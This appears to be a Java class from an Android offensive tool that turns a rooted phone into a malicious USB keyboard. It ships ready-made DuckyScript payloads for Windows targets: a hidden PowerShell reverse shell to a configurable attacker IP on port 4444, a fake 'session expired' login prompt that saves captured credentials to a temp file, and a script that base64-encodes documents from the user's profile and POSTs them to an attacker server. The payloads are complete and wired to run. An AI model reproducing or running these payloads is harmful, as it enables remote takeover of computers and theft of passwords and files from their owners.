package com.offensive.phonehacker;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import java.io.*;
import java.util.*;

/**
 * BadUsbAttack - Orchestrates USB HID attacks including Rubber Ducky payloads
 * Combines UsbHidEmulator and DuckyScriptParser for comprehensive USB attacks
 */
public class BadUsbAttack {
    private static final String TAG = "BadUsbAttack";
    
    public enum AttackType {
        KEYBOARD_INJECT,    // Keystroke injection
        MOUSE_JIGGLER,      // Keep system awake
        REVERSE_SHELL,      // Open reverse shell
        CREDENTIAL_HARVEST, // Credential stealing
        EXFILTRATION,       // Data exfiltration
        CUSTOM_PAYLOAD      // User-defined payload
    }
    
    public interface AttackCallback {
        void onStatusUpdate(String status);
        void onProgress(int percent);
        void onLogMessage(String message);
        void onAttackComplete(boolean success, String summary);
    }
    
    private Context context;
    private UsbHidEmulator hidEmulator;
    private DuckyScriptParser duckyParser;
    private AttackCallback callback;
    private Handler mainHandler;
    private boolean isAttacking = false;
    
    // Built-in payloads
    private static final Map<AttackType, String> BUILTIN_PAYLOADS = new HashMap<>();
    
    static {
        // Windows reverse shell payload
        BUILTIN_PAYLOADS.put(AttackType.REVERSE_SHELL, 
            "REM Windows Reverse Shell\n" +
            "DELAY 1000\n" +
            "GUI r\n" +
            "DELAY 500\n" +
            "STRING powershell -w hidden -ep bypass\n" +
            "ENTER\n" +
            "DELAY 1000\n" +
            "STRING $c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\n" +
            "ENTER\n");
        
        // Credential harvesting payload
        BUILTIN_PAYLOADS.put(AttackType.CREDENTIAL_HARVEST,
            "REM Windows Credential Harvester\n" +
            "DELAY 1000\n" +
            "GUI r\n" +
            "DELAY 500\n" +
            "STRING powershell -w hidden\n" +
            "ENTER\n" +
            "DELAY 1000\n" +
            "STRING [void][Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]\n" +
            "ENTER\n" +
            "DELAY 500\n" +
            "STRING $options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()\n" +
            "ENTER\n" +
            "STRING $options.Message = 'Windows Security - Your session has expired'\n" +
            "ENTER\n" +
            "STRING $options.Caption = 'Authentication Required'\n" +
            "ENTER\n" +
            "STRING $options.TargetName = 'WindowsLogin'\n" +
            "ENTER\n" +
            "STRING $options.AuthenticationProtocol = 'Basic'\n" +
            "ENTER\n" +
            "STRING $cred = [Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options).GetAwaiter().GetResult()\n" +
            "ENTER\n" +
            "STRING $cred.CredentialUserName + ':' + $cred.CredentialPassword | Out-File $env:TEMP\\creds.txt\n" +
            "ENTER\n");
        
        // Data exfiltration payload
        BUILTIN_PAYLOADS.put(AttackType.EXFILTRATION,
            "REM Windows Data Exfiltration\n" +
            "DELAY 1000\n" +
            "GUI r\n" +
            "DELAY 500\n" +
            "STRING powershell -w hidden\n" +
            "ENTER\n" +
            "DELAY 1000\n" +
            "STRING $d=@();$d+=Get-ChildItem $env:USERPROFILE\\Documents -Recurse -Include *.doc*,*.xls*,*.pdf,*.txt -ErrorAction SilentlyContinue|Select -First 10\n" +
            "ENTER\n" +
            "STRING $d|%{$c=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName));$n=$_.Name;Invoke-WebRequest -Uri \"http://ATTACKER_IP/exfil?f=$n\" -Method POST -Body $c}\n" +
            "ENTER\n");
        
        // Mouse jiggler to prevent sleep
        BUILTIN_PAYLOADS.put(AttackType.MOUSE_JIGGLER,
            "REM Mouse Jiggler - keeps system awake\n" +
            "DELAY 1000\n");
    }
    
    public BadUsbAttack(Context context) {
        this.context = context;
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.hidEmulator = new UsbHidEmulator(context);
        this.duckyParser = new DuckyScriptParser(hidEmulator);
        
        setupCallbacks();
    }
    
    private void setupCallbacks() {
        hidEmulator.setStatusCallback(new UsbHidEmulator.StatusCallback() {
            @Override
            public void onStatus(String message) {
                postLog("[HID] " + message);
            }
            
            @Override
            public void onError(String error) {
                postLog("[HID ERROR] " + error);
            }
        });
        
        duckyParser.setCallback(new DuckyScriptParser.ExecutionCallback() {
            @Override
            public void onCommandExecuted(String command, boolean success) {
                postLog("[CMD] " + command + (success ? " ✓" : " ✗"));
            }
            
            @Override
            public void onProgress(int current, int total) {
                int percent = (total > 0) ? (current * 100 / total) : 0;
                postProgress(percent);
            }
            
            @Override
            public void onLog(String message) {
                postLog("[DUCKY] " + message);
            }
            
            @Override
            public void onComplete(boolean success, String summary) {
                isAttacking = false;
                postComplete(success, summary);
            }
        });
    }
    
    public void setCallback(AttackCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Initialize the attack system
     */
    public boolean initialize() {
        postStatus("Initializing USB HID emulator...");
        
        if (!hidEmulator.hasRoot()) {
            postLog("WARNING: Root access not available. Some features may not work.");
        }
        
        boolean success = hidEmulator.initialize(UsbHidEmulator.HidMode.KEYBOARD);
        if (success) {
            postStatus("USB HID ready");
        } else {
            postStatus("USB HID initialization failed - running in simulation mode");
        }
        
        return success;
    }
    
    /**
     * Execute a built-in attack type
     */
    public void executeAttack(AttackType type, String attackerIp) {
        if (isAttacking) {
            postLog("Attack already in progress");
            return;
        }
        
        isAttacking = true;
        postStatus("Starting " + type.name() + " attack...");
        
        if (type == AttackType.MOUSE_JIGGLER) {
            executeMouseJiggler();
            return;
        }
        
        String payload = BUILTIN_PAYLOADS.get(type);
        if (payload == null) {
            postComplete(false, "No payload for attack type: " + type);
            return;
        }
        
        // Replace placeholder with actual attacker IP
        if (attackerIp != null && !attackerIp.isEmpty()) {
            payload = payload.replace("ATTACKER_IP", attackerIp);
        }
        
        duckyParser.executeScript(payload);
    }
    
    /**
     * Execute a custom DuckyScript payload
     */
    public void executeCustomPayload(String script) {
        if (isAttacking) {
            postLog("Attack already in progress");
            return;
        }
        
        isAttacking = true;
        postStatus("Executing custom payload...");
        duckyParser.executeScript(script);
    }
    
    /**
     * Execute payload from file
     */
    public void executePayloadFile(String filePath) {
        if (isAttacking) {
            postLog("Attack already in progress");
            return;
        }
        
        try {
            String script = DuckyScriptParser.loadScriptFromFile(filePath);
            executeCustomPayload(script);
        } catch (IOException e) {
            postComplete(false, "Failed to load payload: " + e.getMessage());
        }
    }
    
    /**
     * Mouse jiggler - moves mouse periodically to prevent sleep
     */
    private void executeMouseJiggler() {
        postStatus("Starting mouse jiggler...");
        
        new Thread(() -> {
            // Switch to mouse mode
            hidEmulator.close();
            hidEmulator.initialize(UsbHidEmulator.HidMode.MOUSE);
            
            int[] movements = {10, -10, 10, -10};
            int index = 0;
            
            while (isAttacking) {
                try {
                    int move = movements[index % movements.length];
                    hidEmulator.moveMouse(move, 0);
                    Thread.sleep(100);
                    hidEmulator.moveMouse(-move, 0);
                    
                    postLog("Mouse jiggle " + (index + 1));
                    postProgress((index % 100));
                    
                    Thread.sleep(30000); // Jiggle every 30 seconds
                    index++;
                } catch (InterruptedException e) {
                    break;
                }
            }
            
            // Switch back to keyboard mode
            hidEmulator.close();
            hidEmulator.initialize(UsbHidEmulator.HidMode.KEYBOARD);
            
            postComplete(true, "Mouse jiggler stopped");
        }).start();
    }
    
    /**
     * Stop any running attack
     */
    public void stopAttack() {
        if (isAttacking) {
            duckyParser.stop();
            isAttacking = false;
            postStatus("Attack stopped");
        }
    }
    
    /**
     * Quick keystroke injection
     */
    public void injectText(String text) {
        if (!hidEmulator.isInitialized()) {
            if (!initialize()) {
                postLog("Failed to initialize HID");
                return;
            }
        }
        
        new Thread(() -> {
            for (char c : text.toCharArray()) {
                int scancode = DuckyScriptParser.getScanCode(c);
                int modifier = DuckyScriptParser.needsShift(c) ? DuckyScriptParser.MOD_SHIFT : DuckyScriptParser.MOD_NONE;
                hidEmulator.sendKeyPress(scancode, modifier);
                try {
                    Thread.sleep(20);
                } catch (InterruptedException e) {
                    break;
                }
            }
            postLog("Text injected: " + text);
        }).start();
    }
    
    /**
     * Send a hotkey combination
     */
    public void sendHotkey(int... keys) {
        if (!hidEmulator.isInitialized()) {
            if (!initialize()) {
                postLog("Failed to initialize HID");
                return;
            }
        }
        
        // Build modifier mask
        int modifiers = 0;
        int scancode = 0;
        
        for (int key : keys) {
            if (key <= 0x08) {
                // It's a modifier
                modifiers |= key;
            } else {
                // It's a key
                scancode = key;
            }
        }
        
        hidEmulator.sendKeyPress(scancode, modifiers);
    }
    
    /**
     * Close and cleanup
     */
    public void close() {
        stopAttack();
        if (hidEmulator != null) {
            hidEmulator.close();
        }
    }
    
    public boolean isAttacking() {
        return isAttacking;
    }
    
    public boolean isInitialized() {
        return hidEmulator != null && hidEmulator.isInitialized();
    }
    
    public boolean hasRoot() {
        return hidEmulator != null && hidEmulator.hasRoot();
    }
    
    // Helper methods to post to UI thread
    private void postStatus(String status) {
        mainHandler.post(() -> {
            if (callback != null) callback.onStatusUpdate(status);
        });
    }
    
    private void postProgress(int percent) {
        mainHandler.post(() -> {
            if (callback != null) callback.onProgress(percent);
        });
    }
    
    private void postLog(String message) {
        Log.d(TAG, message);
        mainHandler.post(() -> {
            if (callback != null) callback.onLogMessage(message);
        });
    }
    
    private void postComplete(boolean success, String summary) {
        mainHandler.post(() -> {
            if (callback != null) callback.onAttackComplete(success, summary);
        });
    }
    
    /**
     * Get list of available attack types
     */
    public static List<AttackType> getAvailableAttacks() {
        return Arrays.asList(AttackType.values());
    }
    
    /**
     * Get description for attack type
     */
    public static String getAttackDescription(AttackType type) {
        switch (type) {
            case KEYBOARD_INJECT:
                return "Inject keystrokes into target system";
            case MOUSE_JIGGLER:
                return "Keep target system awake by moving mouse";
            case REVERSE_SHELL:
                return "Open PowerShell reverse shell to attacker";
            case CREDENTIAL_HARVEST:
                return "Display fake login prompt to harvest credentials";
            case EXFILTRATION:
                return "Exfiltrate documents from user profile";
            case CUSTOM_PAYLOAD:
                return "Execute custom DuckyScript payload";
            default:
                return "Unknown attack type";
        }
    }
}
